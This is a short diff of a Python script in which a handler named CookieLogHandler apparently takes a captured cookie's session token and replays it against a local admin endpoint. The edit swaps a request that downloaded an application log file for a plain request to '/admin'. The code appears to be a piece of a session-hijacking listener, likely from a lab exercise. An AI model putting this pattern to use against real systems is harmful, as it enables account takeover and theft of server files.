@@ -31,8 +31,7 @@ class CookieLogHandler(BaseHTTPRequestHandler):
         token = session_token(cookie)
         try:
             response = requests.get(
-                "http://127.0.0.1:8000/admin/logs/download",
-                params={"file": "var/www/app/logs/activity.log"},
+                "http://127.0.0.1:8000/admin",
                 cookies={"session": token},
                 timeout=5,
             )
